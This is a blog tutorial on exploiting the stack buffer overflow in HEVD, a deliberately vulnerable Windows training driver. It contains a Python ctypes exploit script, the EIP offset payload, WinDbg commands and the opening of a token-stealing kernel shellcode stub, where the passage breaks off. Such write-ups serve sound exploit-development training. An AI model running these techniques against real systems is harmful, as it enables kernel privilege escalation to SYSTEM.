<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HEVD: Stack Overflow exploitation" /><meta property="og:locale" content="en_US" /><meta name="description" content="Loading HEVD driver" /><meta property="og:description" content="Loading HEVD driver" /><link rel="canonical" href="https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/" /><meta property="og:url" content="https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/" /><meta property="og:site_name" content="Hello World" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-04T09:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HEVD: Stack Overflow exploitation" /><meta name="twitter:site" content="@wojtekgoo" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-04T09:00:00+01:00","datePublished":"2022-01-04T09:00:00+01:00","description":"Loading HEVD driver","headline":"HEVD: Stack Overflow exploitation","mainEntityOfPage":{"@type":"WebPage","@id":"https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/"},"url":"https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/"}</script> --><title>HEVD: Stack Overflow exploitation | Hello World</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/photo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hello World</a></div><div class="site-subtitle font-italic">A tagline</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://www.linkedin.com/in/wojtekgusztyla/" aria-label="linkedin" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/wojtekgoo" aria-label="github" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['wojtekgoo','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HEVD: Stack Overflow exploitation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HEVD: Stack Overflow exploitation</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Wojtek </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jan 4, 2022, 9:00 AM +0100" prep="on" > Jan 4 <i class="unloaded">2022-01-04T09:00:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2035 words">11 min</span> <span id="pv" class="pageviews"><i class="fas fa-spinner fa-spin fa-fw"></i></span></div></div><div class="post-content"><h2 id="loading-hevd-driver"><span class="myheader">Loading HEVD driver</span></h2><p>In this post we will be exploiting the Stack Overflow vulnerability in the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD v3</a> driver. We’re going to use Windows 7 SP1 as our target. To get better understanding of how drivers work in Windows, I recommend to read the previous blogpost where I explain some basic concepts.</p><p>To load the driver, we download first the pre-built executable from <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases">here</a> (or build it from source if you have too much time). Then, we download and run the <a href="https://www.osronline.com/article.cfm%5earticle=157.htm">OSR Driver Loader</a> to load the driver in the debugee:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/osr_tool.png" alt="OSR tool" /> <em>OSR Driver Loader</em></p><p>If all went well, we should see a new driver in the list of loaded modules:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/windbg_loaded_hevd.png" alt="HEVD loaded" /> <em>HEVD loaded in the debugee</em></p><p>Red line marks memory address where the driver was loaded.</p><h2 id="vulnerability"><span class="myheader">Vulnerability</span></h2><p>Vulnerability exists in the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/BufferOverflowStack.c">BufferOverflowStack.c</a> file, in the <code>TriggerBufferOverflowStack</code> function:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cp">#ifdef SECURE
</span>        <span class="c1">//</span>
        <span class="c1">// Secure Note: This is secure because the developer is passing a size</span>
        <span class="c1">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span>
        <span class="c1">// there will be no overflow</span>
        <span class="c1">//</span>

        <span class="n">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span>
<span class="cp">#else
</span>        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Triggering Buffer Overflow in Stack</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">//</span>
        <span class="c1">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span>
        <span class="c1">// because the developer is passing the user supplied size directly to</span>
        <span class="c1">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span>
        <span class="c1">// equal to the size of KernelBuffer</span>
        <span class="c1">//</span>

        <span class="n">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</pre></table></code></div></div><p>Inspecting <code>else</code> condition, we notice that the <code>RtlCopyMemory</code> function copies full length of the supplied <code>UserBuffer</code> to the <code>KernelBuffer</code> leading to the stack buffer overflow vulnerability, as we are able to overwrite information on the stack and diverge the code execution from a current path to e.g. a shellcode. <code>Size</code> argument is not validated in any way and is equal to the size of the user supplied data:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Size</span> <span class="o">=</span> <span class="n">IrpSp</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
</pre></table></code></div></div><p>In the <code>SECURE</code> version, this is taken care of as max length of the copied data is not larger than the <code>KernelBuffer</code> itself as specified by the <code>sizeof</code> operator.</p><h2 id="exploitation"><span class="myheader">Exploitation</span></h2><p>To exploit this vulnerability we need to make the driver code follow the correct execution flow and reach the vulnerable code. Below we can observe in IDA Pro what is the path we need to take:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/ida_stackbo_path.png" alt="IDA Stack BO path" /> <em>stack buffer overflow path in IDA Pro</em></p><p><code>DriverEntry</code> is the first piece of code called after a driver is loaded. In the code there is also <code>IrpDeviceIoCtlHandler</code> function defined that handles incoming IOCTL control codes inside IRP packets. Based on the information in the packet, function will redirect execution to the appropriate IOCTL handler - <code>BufferOverflowStackIoCtlHandler</code> in this case - which is a wrapper for <code>TriggerBufferOverflowStack</code> that contains the vulnerable code as described in the ‘Vulnerability’ section above.</p><p>Our next task is to determine what IOCTL needs to be send to trigger the vulnerability.</p><h3 id="ioctl"><span class="myheader">IOCTL</span></h3><p>Let’s have a look at the source code first. <br /> <code>IrpDeviceIoCtlHandler</code> function uses <em>switch</em> statement to transfer control to a correct handler, depending on the IOCTL received:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/code_IrpDeviceIoCtlHandler.png" alt="IrpDeviceIoCtlHandler source code" /> <em>source code of the IrpDeviceIoCtlHandler</em></p><p>Driver will execute the <code>BufferOverflowStackIoctlHandler</code> function, in case of <em>HEVD_IOCTL_BUFFER_OVERFLOW_STACK</em> value in the switch statement. <em>HEVD_IOCTL_BUFFER_OVERFLOW_STACK</em> is a macro that corresponds to the IOCTL with 0x800 function code in it. So in order to trigger the vulnerability, we need to use 0x800 in the IOCTL creation. Other IOCTL sections are constant: <em>FILE_DEVICE_UNKNOWN, METHOD_NEITHER, FILE_ANY_ACCESS</em></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/code_IOCTL_definitions.png" alt="IOCTL definitions" /> <em>IOCTL definitions</em></p><p>This is how the disassembled <code>IrpDeviceIoCtlHandler</code> function code looks in IDA:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/ida_stackbo_flow.png" alt="IrpDeviceIoCtlHandler" /> <em>switch statement and IOCTL handler</em></p><p><code>0x222003</code> is deducted from the IOCTL value held in ECX and the result is loaded into EAX register (1). If the difference is larger than <code>0x6C</code>, program jumps to a different part of code to return <em>”[-] Invalid IOCTL Code: “</em> message. It means there are 109 possible IOCTL codes that will be accepted by the program, in the range <code>0x222003 - 0x22206f</code>.</p><p><br /></p><p>If the difference is smaller or equal to <code>0x6C</code>, the IOCTL is used in the <em>jmp</em> instruction to jump to the correct offset from the jump table (2). In the bottom of the picture, we see code at one of the offsets that calls <code>BufferOverflowStackIoctlHandler</code>(3).</p><p><br /></p><p>To create IOCTLs, we can use online IOCTL decoder<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> and provide all values in the given range to see which ones fit our needs. If we put the first value, 0x222003, we see that this is the correct IOCTL to trigger stack buffer overflow:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/online_ioctl_decoder.png" alt="Online IOCTL decoder" /> <em>online IOCTL decoder</em></p><p>We can also create IOCTL values from scratch with some Python code. To do that, we need look up hex values of the IOCTL constants (e.g. <a href="https://github.com/tandasat/WinIoCtlDecoder/blob/master/plugins/WinIoCtlDecoder.py">here</a>):</p><ul><li>FILE_DEVICE_UNKNOWN = 0x22<li>METHOD_NEITHER = 0x3<li>FILE_ANY_ACCESS = 0x0</ul><p>From the <a href="https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/#fnref:4">Primer</a> we know that we have to move <em>Device Type</em> to the 16th bit, <em>Required Access</em> to the 14th bit, <em>Function Code</em> to 2nd and <em>Transfer Type</em> to the end:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ioctl</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="mh">0x22</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x0</span> <span class="o">&lt;&lt;</span> <span class="mi">14</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x800</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x3</span><span class="p">)</span>
</pre></table></code></div></div><h3 id="buffer-overflow"><span class="myheader">Buffer Overflow</span></h3><p>With all the relevant information needed to trigger the vulnerability, we can build exploit. To develop exploit we will use <code>ctypes</code> library that allow Python code to call C functions and enable low-level memory manipulation. <br /> To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>, putting instead of file name name of the HEVD device, which we can get e.g. from the WinObj tool.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/winobj_nameOfHevdDevice.png" alt="Name of HEVD device" /> <em>device name in WinObj tool</em></p><p>To send and receive messages to and from kernel driver, we can use <code>DeviceIoControl</code> API. Before we do that, we need to create proper IOCTL that will be dissected and understood by the HEVD device. We can use for that</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">ctypes</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">struct</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span>

<span class="c1"># open handle to the device
</span><span class="n">hevd</span> <span class="o">=</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">CreateFileW</span><span class="p">(</span>
    <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">,</span>    <span class="c1"># file name
</span>    <span class="mh">0xC0000000</span><span class="p">,</span>     <span class="c1"># access: GENERIC READ | GENERIC WRITE, bits 30 and 31 are set
</span>    <span class="mi">0</span><span class="p">,</span>                                          
    <span class="bp">None</span><span class="p">,</span>
    <span class="mh">0x3</span><span class="p">,</span>            <span class="c1"># action to take on a device: OPEN EXISTING 
</span>    <span class="mi">0</span><span class="p">,</span>
    <span class="bp">None</span>
<span class="p">)</span>
    
<span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="n">hevd</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">hevd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Failed to retrieve handle: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">GetLastError</span><span class="p">()))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># malicious payload
</span><span class="n">buf</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x900</span>
<span class="n">buf_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="c1"># send message to the device
</span><span class="n">kernel32</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">(</span>
    <span class="n">hevd</span><span class="p">,</span>               <span class="c1"># device handle
</span>    <span class="mh">0x222003</span><span class="p">,</span>           <span class="c1"># IOCTL
</span>    <span class="n">buf</span><span class="p">,</span>            
    <span class="n">buf_size</span><span class="p">,</span>       
    <span class="bp">None</span><span class="p">,</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span>
    <span class="bp">None</span>
<span class="p">)</span>
</pre></table></code></div></div><p>In WinDbg, in the debugger machine, we enable printing debug messages and put breakpoint at <code>TriggerBufferOverflowStack</code> function to see what happens when we execute above code.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">ed</span> <span class="n">Kd_DEFAULT_Mask</span> <span class="mi">8</span>
<span class="o">!</span><span class="n">sym</span> <span class="n">noisy</span>
<span class="p">.</span><span class="n">reload</span> <span class="o">/</span><span class="n">f</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span>
<span class="n">bp</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerBufferOverflowStack</span>
</pre></table></code></div></div><p>If there are no debug messages printed in the WinDbg output, try to run below command on the debuggee:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">reg</span> <span class="n">add</span> <span class="s">"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter"</span> <span class="o">/</span><span class="n">v</span> <span class="n">DEFAULT</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mh">0xf</span>
</pre></table></code></div></div><p>When we execute the script, we can observe that our breakpoint is hit and return address is overwritten by our buffer. The driver printout states also that the <em>UserBuffer</em> size is 0x800 bytes only, but we copied there 0x900 bytes of the buffer, modifying therefore the return address and causing crash</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/windbg_bp_TriggerBufferOverflowStack.png" alt="BP triggered" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/windbg_stackBO.png" alt="Buffer Overflow" /></p><p>Using e.g. <em>pattern_create</em> and <em>pattern_offset</em> tools from the Metasploit framework, we can find correct offset for EIP (2080 bytes):</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="c1"># malicious payload
</span><span class="n">buf</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">2080</span> <span class="o">+</span> <span class="s">"BBBB"</span> <span class="o">+</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">220</span>
<span class="n">buf_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="p">...</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/windbg_correct_buffer_length.png" alt="Buffer Overflow" /></p><p>Knowing the offset needed to control EIP, we can move on to the final exploit code.</p><h3 id="exploit"><span class="myheader">Exploit</span></h3><p>The HackSysTeam published sample token stealing payload that we can use for our needs<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>:</p><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="n">pushad</span>                               <span class="p">;</span> <span class="n">Save</span> <span class="n">registers</span> <span class="n">state</span>

<span class="p">;</span> <span class="n">Start</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>
<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                         <span class="p">;</span> <span class="n">Set</span> <span class="n">ZERO</span>
<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">KTHREAD_OFFSET</span><span class="p">]</span>   <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KPCR</span><span class="p">.</span><span class="n">PcrbData</span><span class="p">.</span><span class="n">CurrentThread</span>
                                     <span class="p">;</span> <span class="n">_KTHREAD</span> <span class="n">is</span> <span class="n">located</span> <span class="n">at</span> <span class="n">FS</span><span class="o">:</span><span class="p">[</span><span class="mh">0x124</span><span class="p">]</span>

<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">EPROCESS_OFFSET</span><span class="p">]</span>     <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KTHREAD</span><span class="p">.</span><span class="n">ApcState</span><span class="p">.</span><span class="n">Process</span>

<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>                         <span class="p">;</span> <span class="n">Copy</span> <span class="n">current</span> <span class="n">process</span> <span class="n">_EPROCESS</span> <span class="n">structure</span>

<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">SYSTEM_PID</span>                  <span class="p">;</span> <span class="n">WIN</span> <span class="mi">7</span> <span class="n">SP1</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">PID</span> <span class="o">=</span> <span class="mh">0x4</span>

<span class="n">SearchSystemPID</span><span class="o">:</span>
    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">FLINK_OFFSET</span><span class="p">]</span>    <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">ActiveProcessLinks</span><span class="p">.</span><span class="n">Flink</span>
    <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="n">FLINK_OFFSET</span>
    <span class="n">cmp</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">PID_OFFSET</span><span class="p">],</span> <span class="n">edx</span>      <span class="p">;</span> <span class="n">Get</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">UniqueProcessId</span>
    <span class="n">jne</span> <span class="n">SearchSystemPID</span>

